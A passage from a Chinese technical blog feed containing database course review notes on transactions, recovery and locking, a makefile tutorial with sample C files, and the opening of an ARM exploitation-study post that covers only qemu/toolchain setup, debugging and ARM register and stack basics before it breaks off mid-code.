</p></li><li><p>与任意一端模式合并。在该关系模式中加入另一关系的码和联系的属性，该关系的码不变。 </p></li></ul><h3 id="一对多-多对一"><a href="#一对多-多对一" class="headerlink" title="一对多/多对一"></a><strong>一对多/多对一</strong></h3><ul><li>转换为新关系。 与该联系相连的各实体的码以及联系本身的属性构成新关系的属性，该关系的码是n端关系模式的码</li><li>与n端模式合并。<strong>在n端关系模式中加入1端关系模式的码和联系的属性，关系的码仍为n端关系的码</strong>。 </li></ul><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a><strong>多对多</strong></h3><ul><li>与该联系相连的各实体的码以及联系本身的属性构成新关系的属性，该关系的码是两端关系模式码的组合。 </li></ul><h1 id="0x06-数据库保护"><a href="#0x06-数据库保护" class="headerlink" title="0x06 数据库保护"></a>0x06 数据库保护</h1><h2 id="6-1-数据库保护和事务"><a href="#6-1-数据库保护和事务" class="headerlink" title="6.1 数据库保护和事务"></a>6.1 数据库保护和事务</h2><p>数据库需要保护，数据库保护包括四个主要功能:备份和恢复、并发控制、安全性控制和完整性控制。</p><h3 id="数据事务概念"><a href="#数据事务概念" class="headerlink" title="数据事务概念"></a>数据事务概念</h3><p>是一个不可分割的操作序列，该操作序列要么全做，要么全不做。</p><p>事务通常是以BEGIN TRANSACTION开始，以COMMIT或ROLLBACK结束。COMMIT表示提交，ROLLBACK表示回滚，在事务运行的过程中发生某种故障事务不能继续执行，系统就会将事务对数据库的已完成操作全部撤销，从而回滚到事务开始时的状态。</p><h3 id="事务执行过程的五种状态"><a href="#事务执行过程的五种状态" class="headerlink" title="事务执行过程的五种状态"></a>事务执行过程的五种状态</h3><ol><li>活动状态</li><li>部分提交状态</li><li>提交状态</li><li>失败状态</li><li>中止状态</li></ol><p><img src="/2021/05/03/Database-review/image-20210508123313748.png" alt="image-20210508123313748"></p><h3 id="事务ACID特性"><a href="#事务ACID特性" class="headerlink" title="事务ACID特性"></a>事务ACID特性</h3><p>1.原子性：事务是不可分割的工作单位。</p><p>2.一致性：事务提交后，数据库从-个一致性状态变到另一个一致性状态。</p><p>3.隔离性：在事务完成之前，它对数据库产生的结果不能被其它事务引用。</p><p>4.持续性：一旦事务执行成功(提交)，其对数据产生的效果永久有效。</p><h2 id="6-2-数据库恢复技术"><a href="#6-2-数据库恢复技术" class="headerlink" title="6.2 数据库恢复技术"></a>6.2 数据库恢复技术</h2><h3 id="数据库故障"><a href="#数据库故障" class="headerlink" title="数据库故障"></a>数据库故障</h3><p>1.事务内部故障：如果当前事务在执行内部操作的时候发生故障，就是事务内部故障，执行UNDO操作。</p><p>2.系统故障：造成系统停止运转并要求系统重新启动的一类故障。</p><p>3.介质故障：导致数据库的数据部分丢失或者全部丢失的一类故障。</p><h3 id="数据库恢复原理和技术"><a href="#数据库恢复原理和技术" class="headerlink" title="数据库恢复原理和技术"></a>数据库恢复原理和技术</h3><p><strong>数据转储</strong>：转储即DBA定期地将整个数据库复制到磁带或另一个磁盘上保存起来的过程。这些备用的数据称为后被副本。</p><p>转储又分为静态转储和动态转储：静态转储必须等待正在运行的用户事务结束才能进行；动态转储是指转储期间允许对数据库进行存取或修改，即转储和用户事务可以并发执行。</p><p>也可分为海量转储和增量转储：海量转储即每次转储全部数据库，增量转储即每次只转储上一次转储后更新的数据。</p><p><strong>登记日志：</strong>日志文件是用来记录事务对数据库的更新操作的文件。不同数据库系统采用的日志文件格式并不完全一样，主要有两种格式：<strong>以记录为单位的日志文件</strong>和<strong>以数据块为单位的日志文件</strong></p><p>每个日志记录的内容主要包括：</p><ul><li>事务标识（标明是哪个事务）</li><li>操作的类型（插入、删除或修改）</li><li>操作对象（记录内部标识）</li><li>更新前数据的旧值（对插入操作而言，此项为空值）</li><li>更新后数据的新值（对删除操作而言，此项为空值）</li></ul><h3 id="数据库故障恢复"><a href="#数据库故障恢复" class="headerlink" title="数据库故障恢复"></a>数据库故障恢复</h3><p><strong>事务内部故障</strong>的恢复步骤：</p><ol><li>①反向扫描日志文件，查找该事务的更新操作</li><li>如果遇到update 操作，则用日志记录中的“前像”更新数据对象;</li><li>如果遇到insert 操作，则做delete操作，删除该数据对象;</li><li>如果遇到delete 操作，则做insert操作,插入之前删掉的数据对象，插入的值是日志记录中的“前像”</li><li>②继续反向扫描日志文件，对每个更新操作进行同样的处理。直到遇见该事务的start记录为止。</li></ol><p><strong>系统故障的恢复</strong>：</p><ol><li>从头扫描日志文件，对具有start和commit的进行REDO，对只有start但无commit，进行UNDO队列。</li><li>对REDO队列进行REDO，正向扫描并执行。</li><li>对UNDO队列进行UNDO，反向扫描并执行逆操作。</li></ol><p><strong>介质故障的恢复：</strong></p><p>DBA利用数据库副本和日志文件副本进行恢复 </p><h2 id="6-3-数据库并发"><a href="#6-3-数据库并发" class="headerlink" title="6.3 数据库并发"></a>6.3 数据库并发</h2><h3 id="多事务并发执行冲突"><a href="#多事务并发执行冲突" class="headerlink" title="多事务并发执行冲突"></a>多事务并发执行冲突</h3><p><strong>条件：</strong></p><ol><li>两个操作来自不同的事务</li><li>两个操作针对同一个对象</li><li>两个操作其中至少有一个写操作</li></ol><p><strong>冲突分类：</strong></p><ol><li>写-写（丢失修改）</li><li>写-读（读脏数据）</li><li>读-写（不可重复读）</li></ol><h2 id="6-4-并发调度和可串行化"><a href="#6-4-并发调度和可串行化" class="headerlink" title="6.4 并发调度和可串行化"></a>6.4 并发调度和可串行化</h2><h3 id="事务简化"><a href="#事务简化" class="headerlink" title="事务简化"></a>事务简化</h3><p><strong>代数表示</strong>：Ri(X)表示事务Ti的读X操作，Wi(X)表示事务Ti的写X操作 </p><p><strong>串行/并发调度</strong>：串行调度事务执行的结果总是正确的，但是不能够充分利用系统资 </p><p>源。并发调度各个事务交叉地执行，但是不一定正确。 </p><h3 id="调度的可串行化"><a href="#调度的可串行化" class="headerlink" title="调度的可串行化"></a>调度的可串行化</h3><p>一个事务集的并发调度与某一串行调度是等价的，可串行化是作为并发调度正确与否的判定准则 </p><h3 id="冲突可串行化"><a href="#冲突可串行化" class="headerlink" title="冲突可串行化"></a>冲突可串行化</h3><p>一个调度Sc在保证冲突操作的次序不变情况下，通过交换两个事务不冲突操作的次序得到另一个调度Sc’， 如果Sc’是串行的，称调度Sc为冲突可串行化调度。</p><p><strong>冲突可串行化一定是可串行化的，但可串行化不一定是冲突可串行化</strong></p><h3 id="前驱图（冲突可串行化的判定方法）："><a href="#前驱图（冲突可串行化的判定方法）：" class="headerlink" title="前驱图（冲突可串行化的判定方法）："></a>前驱图<strong>（冲突可串行化的判定方法）</strong>：</h3><p>V是由所有参加调度的事务构成的节点，E是图中的一条有向边，如果Oi和Oj是冲突操作，且Oi先于Oj执行，则在图中有一条边Ti→Tj，如果得到无环的前趋图，则是可串行化的 。</p><h3 id="拓扑图（获得调度S的一个等价的串行调度）："><a href="#拓扑图（获得调度S的一个等价的串行调度）：" class="headerlink" title="拓扑图（获得调度S的一个等价的串行调度）："></a>拓扑图（获得调度S的一个等价的串行调度）：</h3><p>数据结构，去线法（输出一个入度为0的顶点，然后删除此顶点，并删除以次顶点为尾的弧） 。</p><h2 id="6-5-事务的隔离性、封锁和并发控制"><a href="#6-5-事务的隔离性、封锁和并发控制" class="headerlink" title="6.5  事务的隔离性、封锁和并发控制"></a>6.5  事务的隔离性、封锁和并发控制</h2><h3 id="封锁"><a href="#封锁" class="headerlink" title="封锁"></a>封锁</h3><p>指事务在对数据对象进行操作之前，必须先向系统申请对数据对象加锁，获得加锁之后才能进行相应的操作。</p><h3 id="排它锁（X锁）"><a href="#排它锁（X锁）" class="headerlink" title="排它锁（X锁）"></a>排它锁（X锁）</h3><p>若事务T对数据对象A加上排它锁，则只允许T读取和修改A，不允许其他任何事务再对A加任何锁，直到T释放A上的X锁。</p><h3 id="共享锁（S锁）"><a href="#共享锁（S锁）" class="headerlink" title="共享锁（S锁）"></a>共享锁（S锁）</h3><p>若事务T对数据对象A加上共享锁，则事务T可以读A但不能修改A，其他事务只能对A加S锁，而不能加X锁，直到T释放A上的S锁 </p><div class="table-container"><table><thead><tr><th>级别</th><th>加锁协议</th><th>放锁</th></tr></thead><tbody><tr><td>一级</td><td>修改数据A之前必须对其加X锁</td><td>事务结束释放X锁</td></tr><tr><td>二级</td><td>一级+事务T在读取数据A之前必须对其加S锁</td><td>读完释放S锁</td></tr><tr><td>三级</td><td>一级+事务T在读取数据A之前必须对其加S锁</td><td>事务结束释放S锁</td></tr></tbody></table></div><p><img src="/2021/05/03/Database-review/image-20210508143748136.png" alt="image-20210508143748136"></p><p><strong>两段锁协议（2PL）</strong>：某一事务在对数据进行读、写之前，先要申请并获得对该数据的封锁。在释放一个封锁之后，事务不再申请和获得任何其它封锁。任何一个遵从2PL协议的调度都是冲突可串行化的（充分不必要条件）。</p><p>分为两个阶段：</p><ol><li>加锁段</li><li>解锁段</li></ol><p>死锁：两个及以上事务相互等待释放锁，利用超时法或等待图发进行死锁检测。</p><p> 活锁：某资源长期被一些事务封锁，其他事务得不到该资源，可采用先来先服务原则避免活锁。</p><h2 id="6-6-数据库完全性与完整性"><a href="#6-6-数据库完全性与完整性" class="headerlink" title="6.6 数据库完全性与完整性"></a>6.6 数据库完全性与完整性</h2><h3 id="数据库完全性控制"><a href="#数据库完全性控制" class="headerlink" title="数据库完全性控制"></a>数据库完全性控制</h3><ol><li>用户标识和鉴别</li><li>存取控制</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;复习&lt;/p&gt;</summary>
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>makefile</title>
    <link href="https://pz1o.top/2021/04/30/makefile/"/>
    <id>https://pz1o.top/2021/04/30/makefile/</id>
    <published>2021-04-30T09:13:37.000Z</published>
    <updated>2021-06-09T11:47:13.169Z</updated>
    
    <content type="html"><![CDATA[<p>懒狗必备，makefile</p><a id="more"></a><p>为什么要写makefile，因为懒</p><h1 id="0x01-简单makefile编写"><a href="#0x01-简单makefile编写" class="headerlink" title="0x01 简单makefile编写"></a>0x01 简单makefile编写</h1><p><strong>makefile的基本格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target : dependency_files ##dependency_files是依赖的文件</span><br><span class="line">command #注意是一个TAB</span><br><span class="line">hello.o:hello.c hello.h</span><br><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><p>eg：</p><p>这里有四个文件 <code>demo1.c</code> <code>demo2.c</code> <code>main.c</code> <code>head.h</code>四个文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//demo2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//head.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"head.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    print1();</span><br><span class="line">    print2();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"it is end"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//makefile</span></span><br><span class="line">demo:demo1.o demo2.o main.o</span><br><span class="line">    gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">demo1.o:demo1.c</span><br><span class="line">    gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">demo2.o:demo2.c</span><br><span class="line">    gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">main.o:main.c</span><br><span class="line">   gcc main.c -Wall -c -o main.o</span><br><span class="line">clean:</span><br><span class="line">rm *.o demo</span><br><span class="line">        </span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">25</span>] pz1o:make_demo $ make      </span><br><span class="line">gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">gcc main.c -Wall -c -o main.o</span><br><span class="line">gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">28</span>] pz1o:make_demo $ ./demo </span><br><span class="line"><span class="keyword">this</span> is demo1</span><br><span class="line"><span class="keyword">this</span> is demo2</span><br><span class="line">it is <span class="built_in">end</span>%</span><br></pre></td></tr></table></figure><h1 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02 变量"></a>0x02 变量</h1><p>变量的命名字可以包含字符、数字，下划线（可以是数字开头），但不应该含有“:”、“#”、“=”或是空字符（空格、回车等）。变量是区分英文字母大小写的。</p><p>预定义变量</p><ul><li>AR    库文件维护程序名称，默认为ar.AS汇编程序名称，默认值为as。</li><li>CC    C编译器的名称，默认为cc。CPP C预编译器的名称，默认值为$(CC) -E</li><li>CXX    C++编译器的名称，默认为g++</li><li>FC    FORTRAN编译器的缩写，默认值为f77</li><li>RM    文件删除程序名称，默认为rm -f</li></ul><p>自动变量</p><p>变量名    变量含义</p><ul><li>$*    不包含扩展名的目标文件名称</li><li>$+    所有的依赖文件，以空格分开，并以出现后的先后为序，可能包含重复依赖文件</li><li>$&lt;    第一个依赖文件的名称</li><li>$?    所有时间戳比目标文件晚的依赖文件，并以空格分开目标文件的完整名称</li><li>$@    目标文件的完整名称</li><li>$^    所有不重复的目标依赖文件，以空格分开</li><li>$%    如果目标是归档成员，则该变量表示目标的归档成员的目标名称</li></ul><p>makefile编写</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line"><span class="section">demo:<span class="variable">$(OBJS)</span></span></span><br><span class="line">        gcc  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo2.o:demo2.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo1.o:demo1.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o:main.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm *.o demo</span><br></pre></td></tr></table></figure><p>改进版的makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line">TARGET=./demo</span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">        <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJS)</span></span><br><span class="line">        <span class="variable">$(CC)</span>  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        <span class="variable">$(RM)</span> *.o demo</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;懒狗必备，makefile&lt;/p&gt;</summary>
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>ARM-pwn</title>
    <link href="https://pz1o.top/2021/04/29/arm-pwn/"/>
    <id>https://pz1o.top/2021/04/29/arm-pwn/</id>
    <published>2021-04-29T07:35:08.000Z</published>
    <updated>2021-06-09T11:48:21.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ARM环境搭建"><a href="#0x01-ARM环境搭建" class="headerlink" title="0x01 ARM环境搭建"></a>0x01 ARM环境搭建</h1><p>安装qemu和arm的一些包</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-system qemu-user-static binfmt-support</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git</span><br><span class="line">sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross</span><br><span class="line"></span><br><span class="line">apt search binutils | grep [arch]</span><br></pre></td></tr></table></figure><p>寻找相关的链接库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br></pre></td></tr></table></figure><p>指定相关的链接库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;vuln</span><br></pre></td></tr></table></figure><p>调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1235 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;vuln</span><br></pre></td></tr></table></figure><p>pwndbg进行调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture arm </span><br><span class="line">pwndbg&gt; target remote localhost:1235</span><br></pre></td></tr></table></figure><p>相关工具链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;编译器</span><br><span class="line">arm-linux-gnueabi-gcc demo.c</span><br><span class="line">&#x2F;&#x2F;反汇编</span><br><span class="line">arm-linux-gnueabi-objdump -sd  demo.so</span><br><span class="line">&#x2F;&#x2F;readelf</span><br><span class="line">arm-linux-gnueabi-readelf -h demo.so                         </span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS&#x2F;ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              DYN (共享目标文件)</span><br><span class="line">  系统架构:                          ARM</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0x2a4</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6152 (bytes into file)</span><br><span class="line">  标志：             0x5000200, Version5 EABI, soft-float ABI</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         6</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         23</span><br><span class="line">  Section header string table index: 22</span><br></pre></td></tr></table></figure><h1 id="0x02-ARM基础知识"><a href="#0x02-ARM基础知识" class="headerlink" title="0x02 ARM基础知识"></a>0x02 ARM基础知识</h1><p>先来看一下arm的历史</p><p><img src="/2021/04/29/arm-pwn/2136036-16042211014K30.png" alt="ARM的发展史以及架构解析"></p><p>接下来看一下ARM的编译器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-os] [-(gnu)eabi]</span><br><span class="line"></span><br><span class="line">arch - 体系架构，如ARM，MIPS</span><br><span class="line">verdor - 工具链提供商</span><br><span class="line">os - 目标操作系统</span><br><span class="line">eabi - 嵌入式应用二进制接口</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">arm-none-eabi-gcc</span><br><span class="line">用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application）</span><br><span class="line"></span><br><span class="line">arm-linux-gnueabi-gcc</span><br><span class="line">主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。</span><br><span class="line"></span><br><span class="line">arm-eabi-gcc</span><br><span class="line">Android ARM 编译器。</span><br><span class="line"></span><br><span class="line">armcc</span><br><span class="line">ARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），</span><br><span class="line"></span><br><span class="line">但是不能编译 Linux 应用程序。</span><br></pre></td></tr></table></figure><p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。</p><p>ARM架构有两种模式，ARM模式和Thumb模式。Thumb模式的代码只有2或者4字节。</p><p>ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。</p><h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1. 寄存器"></a>1. 寄存器</h2><ol><li>子程序间通过寄存器<strong>R0～R3</strong>来<strong>传递参数</strong>。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li><li>在子程序中，使用寄存器<strong>R4～R11</strong>来<strong>保存局部变量</strong>。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则<strong>子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值</strong>。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li><li>寄存器<strong>R12</strong>用作<strong>过程调用中间临时寄存器</strong>，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li><li>寄存器<strong>R13</strong>用作<strong>堆栈指针</strong>，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li><li>寄存器<strong>R14</strong>称为<strong>连接寄存器</strong>，记作LR。它用于<strong>保存子程序的返回地址</strong>。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li><li>寄存器<strong>R15</strong>是<strong>程序计数器</strong>，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li></ol><p>ARM和Intel的对比</p><div class="table-container"><table><thead><tr><th style="text-align:center">ARM架构 寄存器名</th><th style="text-align:center">寄存器描述</th><th style="text-align:center">Intel架构 寄存器名</th></tr></thead><tbody><tr><td style="text-align:center">R0</td><td style="text-align:center">通用寄存器</td><td style="text-align:center">EAX</td></tr><tr><td style="text-align:center">R1~R5</td><td style="text-align:center">通用寄存器</td><td style="text-align:center">EBX、ECX、EDX、EDI、ESI</td></tr><tr><td style="text-align:center">R6~R10</td><td style="text-align:center">通用寄存器</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">R11(FP)</td><td style="text-align:center">栈帧指针</td><td style="text-align:center">EBP</td></tr><tr><td style="text-align:center">R12(IP)</td><td style="text-align:center">内部程序调用</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">R13(SP)</td><td style="text-align:center">堆栈指针</td><td style="text-align:center">ESP</td></tr><tr><td style="text-align:center">R14(LR)</td><td style="text-align:center">链接寄存器</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">R15(PC)</td><td style="text-align:center">程序计数器</td><td style="text-align:center">EIP</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">程序状态寄存器</td><td style="text-align:center">EFLAGS</td></tr></tbody></table></div><h2 id="2-堆栈"><a href="#2-堆栈" class="headerlink" title="2. 堆栈"></a>2. 堆栈</h2><ol><li><p>ATPCS规定堆栈为FD类型，即Full Descending，意思是 <strong>SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长</strong>，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有<strong>STMFD和LDMFD</strong>。</p></li><li><p>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。<code>STMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP - <span class="number">9</span> x <span class="number">4</span> (共计压入R0-R7以及LR一共九个寄存器)</span><br><span class="line">ADDRESS = SP</span><br><span class="line">MEMORY[ADDRESS] = LR</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">7</span> to <span class="number">0</span></span><br><span class="line">    MEMORY[ADDRESS] = Ri</span><br><span class="line">    ADDRESS = ADDRESS + <span class="number">4</span></span><br></pre></td></tr></table></figure><p>最终实现的堆栈图片<img src="/2021/04/29/arm-pwn/image-20210429201433283.png" alt="image-20210429201433283"></p><blockquote><p>若入栈指令为<code>STMFD SP ,{R0-R7，LR}</code>，SP指针会在最后回到原位，不会改变SP指针的值。</p></blockquote></li><li><p>LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。<code>LDMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP 